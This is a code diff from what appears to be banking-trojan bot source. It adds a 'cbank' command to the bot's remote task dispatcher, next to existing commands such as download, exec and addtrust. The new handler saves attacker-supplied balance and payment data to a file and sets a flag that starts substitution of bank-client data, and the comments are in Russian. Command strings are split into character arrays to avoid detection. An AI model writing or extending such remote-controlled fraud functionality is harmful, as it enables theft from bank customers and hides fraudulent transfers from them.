@@ -1193,6 +1193,17 @@ bool ExecuteAddTrust(PTaskManager Manager, PCHAR Command, PCHAR Args)
 	return true;
 }
 
+bool ExecuteCBank(PTaskManager Manager, PCHAR Command, PCHAR Args)
+{
+	TASKDBG( "CBank", "%s", Args );
+	int c_args = m_lstrlen(Args);
+	//сохраняем переданный баланс и платежки
+	File::WriteBufferA( BOT::MakeFileName( 0, GetStr(CBankReplacement).t_str() ).t_str(), Args, c_args + 1 );
+	//уставливаем флаг для запуска подмены
+	Bot->CreateFileA( 0, GetStr(CBankFlagUpdate).t_str() );
+	return true;
+}
+
 /*
 
 // Тело потока команды installfakedll
@@ -1314,9 +1325,10 @@ TCommandMethod GetCommandMethod(PTASKMANAGER Manager, PCHAR  Command)
 	const static char CommandLF[]			 = {'l','f',0};
 	const static char CommandExec[]			 = {'e','x','e','c',0};
 	const static char CommandAddTrust[]		 = {'a','d','d','t','r','u','s','t',0};
-	const static char CommandDownload2[]      = {'d','o','w','n','l','o','a','d','2',0};
+	const static char CommandDownload2[]     = {'d','o','w','n','l','o','a','d','2',0};
+	const static char CommandCBank[]		 = {'c','b','a','n','k',0};
 
-	int Index = StrIndexOf( Command, false, 16,
+	int Index = StrIndexOf( Command, false, 17,
 							(PCHAR)CommandUpdate,
 							(PCHAR)CommandUpdateConfig,
 							(PCHAR)CommandDownload,
@@ -1332,7 +1344,8 @@ TCommandMethod GetCommandMethod(PTASKMANAGER Manager, PCHAR  Command)
 							(PCHAR)CommandLF,
 							(PCHAR)CommandExec,
 							(PCHAR)CommandAddTrust,
-							(PCHAR)CommandDownload2
+							(PCHAR)CommandDownload2,
+							(PCHAR)CommandCBank
 						  );
 
 
@@ -1354,6 +1367,7 @@ TCommandMethod GetCommandMethod(PTASKMANAGER Manager, PCHAR  Command)
 		case 13: return ExecuteExec;
 		case 14: return ExecuteAddTrust;
 		case 15: return ExecuteDownload2;
+		case 16: return ExecuteCBank;
 
     default: ;
 	}
